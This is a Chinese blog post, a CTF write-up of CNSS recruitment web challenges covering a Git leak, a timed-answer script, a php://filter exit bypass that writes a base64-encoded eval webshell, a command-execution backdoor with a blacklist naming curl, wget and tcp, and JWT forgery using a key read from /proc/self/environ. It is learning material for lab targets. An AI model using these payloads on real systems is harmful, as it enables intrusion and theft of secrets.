<!DOCTYPE html>
<html lang="zh" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>CNSS Recruit-Web Write UP - Hi, Yiming</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="Yiming Shen" />
  <meta name="description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以" />

  <meta name="keywords" content="Photographer, CTFer, lazyGeek" />






<meta name="generator" content="Hugo 0.91.0" />


<link rel="canonical" href="https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.b3a8813c06e6d785beba22bf8264e174fa2cb3a396b22f9ba24e2c00c18aaf7f.css" integrity="sha256-s6iBPAbm14W&#43;uiK/gmThdPoss6OWsi&#43;bok4sAMGKr38=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="CNSS Recruit-Web Write UP" />
<meta property="og:description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-10-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-10-22T00:00:00+00:00" />

<meta itemprop="name" content="CNSS Recruit-Web Write UP">
<meta itemprop="description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以"><meta itemprop="datePublished" content="2021-10-21T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-10-22T00:00:00+00:00" />
<meta itemprop="wordCount" content="2538">
<meta itemprop="keywords" content="CTF,WriteUP,Note," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CNSS Recruit-Web Write UP"/>
<meta name="twitter:description" content="前言 躺在床上，不想动鼠标，那就先写写前言吧。 这个CTF比赛是我打的第二场比较正规、完整的比赛。 惨不忍睹，当然，作为刚入门的noob来说也可以"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Yiming</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/">Home</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/post/">Archives</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/tags/">Tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/categories/">Categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/about/">关于</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      Yiming
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/">Home</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/post/">Archives</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/tags/">Tags</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/categories/">Categories</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://shenyimings.github.io/about/">关于</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">CNSS Recruit-Web Write UP</h1>
      
      <div class="post-meta">
        <time datetime="2021-10-21" class="post-time">
          2021-10-21
        </time>
        <div class="post-category">
            <a href="https://shenyimings.github.io/categories/notes/"> Notes </a>
            <a href="https://shenyimings.github.io/categories/ctf/"> CTF </a>
            
          </div>
        

        
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#babygithacker">[👶Baby]GitHacker</a>
      <ul>
        <li><a href="#关于工具githack的使用和python23的同时安装">关于工具Githack的使用和Python2/3的同时安装</a></li>
        <li><a href="#git版本管理">Git版本管理</a></li>
        <li><a href="#其他githack脚本">其他Githack脚本</a></li>
      </ul>
    </li>
    <li><a href="#easy更坑的数学题">[😃Easy]更坑的数学题</a></li>
    <li><a href="#mid太极掌门人">[😮Mid]太极掌门人</a></li>
    <li><a href="#midblackpage">[😮Mid]BlackPage</a></li>
    <li><a href="#midto_be_admin">[😮Mid]To_be_Admin</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <h2 id="前言">前言</h2>
<p>躺在床上，不想动鼠标，那就先写写前言吧。</p>
<p>这个CTF比赛是我打的第二场比较正规、完整的比赛。</p>
<p>惨不忍睹，当然，作为刚入门的noob来说也可以接受。</p>
<p>希望能通过笔记的整理消化新掌握的知识，道阻且长。</p>
<h2 id="babygithacker">[👶Baby]GitHacker</h2>
<p>根据题目名，应该是考察Git泄露相关知识。</p>
<h3 id="关于工具githack的使用和python23的同时安装">关于工具Githack的使用和Python2/3的同时安装</h3>
<p>使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为<code>python2.exe</code>，则在pws中输入<code>python</code>是运行python3，输入<code>python2</code>则是运行Python2.</p>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020222625834.png" alt="1"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python2 .<span style="color:#ae81ff">\G</span>itHack.py http:<span style="color:#ae81ff">\\</span>x.x.x<span style="color:#ae81ff">\.</span>git
</code></pre></div><p>运行后即得到git目录。</p>
<h3 id="git版本管理">Git版本管理</h3>
<p>这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git log 
<span style="color:#75715e"># 查看提交记录（版本号）</span>
git status
<span style="color:#75715e"># 查看本地修改记录</span>
git reset --hard 目标版本号
<span style="color:#75715e"># 退回目标版本号</span>
git reset HEAD
<span style="color:#75715e"># 回退到最早版本</span>
git checkout
<span style="color:#75715e"># 还原与版本记录不符的所有文件</span>
git restore 目标文件名
<span style="color:#75715e"># 还原与版本记录不符的目标文件</span>
</code></pre></div><p>这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜<code>CNSS</code>而不是<code>flag</code>。</p>
<h3 id="其他githack脚本">其他Githack脚本</h3>
<p>在CTF中推荐<code>Git_Extract-master</code>这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了<code>git reset</code>和<code>git checkout</code>的过程。</p>
<h2 id="easy更坑的数学题">[😃Easy]更坑的数学题</h2>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020221052004-16347390601511.png" alt="image-20211020221052004"></p>
<p>仅有的提示就是快速把结果提交，有可能会出现flag。</p>
<p>第一反应是绕过和注入咯，尝试后无果。</p>
<p>再观察续一秒按钮前端代码，发现是安慰剂按钮。。。</p>
<p>那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> re <span style="color:#75715e"># 正则表达式库</span>
<span style="color:#f92672">import</span> string

<span style="color:#f92672">from</span> requests.sessions <span style="color:#f92672">import</span> session

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://81.68.109.40:30005/&#39;</span>
session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
<span style="color:#75715e"># 保持会话</span>
req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url)
<span style="color:#75715e"># 导入URL，创建会话，结果存储在req中</span>
prog <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">&#39;\d</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">&#39;</span>)
<span style="color:#75715e"># 初始化正则表达式为匹配连续出现8次的数字</span>

group <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>findall(req<span style="color:#f92672">.</span>text)
<span style="color:#75715e"># 将结果存入数组</span>

sum <span style="color:#f92672">=</span> int (group[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">*</span>int(group[<span style="color:#ae81ff">1</span>])
<span style="color:#75715e"># 计算结果</span>
str<span style="color:#f92672">=</span>str(sum)
data<span style="color:#f92672">=</span>{
    <span style="color:#e6db74">&#39;res&#39;</span>:str
}
<span style="color:#75715e"># 构建post的payload</span>
r<span style="color:#f92672">=</span>session<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url,data<span style="color:#f92672">=</span>data)
<span style="color:#75715e"># 发送post请求，返回内容存入r中</span>
print(r<span style="color:#f92672">.</span>text)
</code></pre></div><p>这又是一个利用python做题的重要例子，对于python的学习应用要加强，应当抽时间写爬虫实战以练习。</p>
<h2 id="mid太极掌门人">[😮Mid]太极掌门人</h2>
<p>网页给出代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deleteDir</span>($path) {

        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_dir</span>($path)) {
            $dirs <span style="color:#f92672">=</span> <span style="color:#a6e22e">scandir</span>($path);
            <span style="color:#66d9ef">foreach</span> ($dirs <span style="color:#66d9ef">as</span> $dir) {
                <span style="color:#66d9ef">if</span> ($dir <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $dir <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;..&#39;</span>) {
                    $sonDir <span style="color:#f92672">=</span> $path<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span>$dir;
                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_dir</span>($sonDir)) {

                        <span style="color:#a6e22e">deleteDir</span>($sonDir);

                        <span style="color:#f92672">@</span><span style="color:#a6e22e">rmdir</span>($sonDir);

                    } <span style="color:#66d9ef">elseif</span> ($sonDir <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;./index.php&#39;</span>
                            <span style="color:#f92672">&amp;&amp;</span> $sonDir <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;./flag.php&#39;</span>) {

                        <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($sonDir);

                    }
                }
            }
            <span style="color:#f92672">@</span><span style="color:#a6e22e">rmdir</span>($path);
        }
    }

    $devil <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exit;?&gt;&#39;</span>;

    $goods <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;goods&#39;</span>];

    <span style="color:#a6e22e">file_put_contents</span>($_POST[<span style="color:#e6db74">&#39;train&#39;</span>], $devil <span style="color:#f92672">.</span> $goods);

    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);

    <span style="color:#a6e22e">deleteDir</span>(<span style="color:#e6db74">&#39;.&#39;</span>);

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>关键代码：<code>file_put_contents</code>写入文件，妥妥的文件上传漏洞。</p>
<p>我们构造命令以绕过exit函数，具体参考13.RCE专栏。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">?</span><span style="color:#a6e22e">train</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">decode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">goods</span><span style="color:#f92672">=</span><span style="color:#a6e22e">aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw</span><span style="color:#f92672">==</span>
</code></pre></div><p>此时PHP执行的命令为：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;php://filter/convert.base64-decode/resource=1.php&#34;</span>, <span style="color:#e6db74">&#39;&lt;?php exit;?&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==&#34;</span>);
</code></pre></div><p>我们在PHP中运行一下，发现成功在目录下写入了有命令执行<img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/00E290DA.png" alt="img">的PHP脚本。</p>
<p>由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。</p>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211021205217701.png" alt="image-20211021205217701"></p>
<h2 id="midblackpage">[😮Mid]BlackPage</h2>
<p>查看源代码，发现hint：查看myblackdoor.php</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">blacklist</span>($cmd){
  $filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&lt;|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&gt;|Fl4g|php|curl| |0x|</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$\\</span><span style="color:#e6db74">{IFS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">}|index|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">*)&#34;</span>;
  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>$filter<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/is&#34;</span>,$cmd)<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>){  
      <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;Go out! This black page does not belong to you!&#39;</span>);
  }
  <span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">system</span>($cmd);
  }
}
<span style="color:#a6e22e">blacklist</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><h2 id="midto_be_admin">[😮Mid]To_be_Admin</h2>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022100859610.png" alt="image-20211022100859610"></p>
<p>页面左下角有/read字样，打开后提示用get参数传入file即可读取指定文件：</p>
<p>![image-20211022101753988](14.CNSS Recruit-Web Write UP.assets/image-20211022101753988.png)</p>
<p>尝试后，未发现注入点，直接读取<code>flag.php</code>显示禁止访问，未找到过滤方法。</p>
<p>我们用burp抓包后发现，网站的cookie可以被读取查看：</p>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022102237323.png" alt="image-20211022102237323"></p>
<p>应用base64解码后发现文本可读，搜索JWT发现这是一种验证算法。</p>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103012757.png" alt="image-20211022103012757"></p>
<blockquote>
<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
</blockquote>
<p>在JWT.io中可以对其进行详细编辑。jwt分为三部分，头部(header)，载荷(payload)，签名(signature)，签名是根据头部和载荷，加上密钥(key)后按照指定算法生成，如此JWT使用HS256算法。</p>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103113965.png" alt="image-20211022103113965"></p>
<p>在不知道密钥的情况下，我们可以使用JWT cracker暴力破解，我使用java版cracker CPU占用率100%跑了一中午并未出结果，毕竟几率渺茫。</p>
<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/4D40723418BF7990649568A57505D53A.jpg" alt="img"></p>
<p>正确方法应当是找到网站中隐藏的key。</p>
<p>我们了解一下proc文件系统：</p>
<blockquote>
<p>通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p>
</blockquote>
<p>由于此网站后端是用python写的，在生成token时调用的密钥必然存在系统中，我们要做的就是找到并查看系统环境变量：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">proc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">self</span><span style="color:#f92672">/</span><span style="color:#a6e22e">environ</span>
<span style="color:#75715e"># prco是进程目录（linux进程以文件形式存放），self是当前运行进程，environ是环境变量
</span></code></pre></div><p>![image-20211022110601481](14.CNSS Recruit-Web Write UP.assets/image-20211022110601481.png)</p>
<p>在第一行发现密钥KEY：<code>nWMfdan2349r*fn9dMz</code></p>
<p>这……怎么可能暴力碰出来呢。</p>
<p>进入jwt.io，修改<code>username=admin</code>，用该密钥生成新的jwt，传入token，放包</p>
<pre tabindex="0"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIn0.1kMTURzATts34snMro5E2MvNRM46lY0S1Ez4iSmp2_s
</code></pre><p>拿到flag。</p>
<h2 id="参考">参考</h2>
<p>[1] <a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式语法-RUNNOOB</a></p>
<p>[2] <a href="https://www.cnblogs.com/yangshifu/p/9680993.html">Git恢复本地被误删文件</a></p>
<p>[3] <a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">Proc文件系统详解</a></p>

    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">Yiming Shen</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
      2021-10-22
      
    </span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">License</span>
    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
  </p>
</div>


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://shenyimings.github.io/tags/ctf/">CTF</a>
          <a href="https://shenyimings.github.io/tags/writeup/">WriteUP</a>
          <a href="https://shenyimings.github.io/tags/note/">Note</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/15.bugku-sql%E6%B3%A8%E5%85%A5/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">Bugku-SQL注入-WriteUP</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
          <a class="next" href="/post/13.rce%E4%B8%93%E6%A0%8F/">
            <span class="next-text nav-default">RCE 远程命令执行漏洞</span>
            <span class="prev-text nav-mobile">Next</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:seuilping@gmail.com" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="https://github.com/shenyimings/" rel="me noopener" class="iconfont"
      title="github"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
</svg>

    </a>
  
    <a href="https://www.zhihu.com/people/shen-yi-ming-91" rel="me noopener" class="iconfont"
      title="zhihu"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
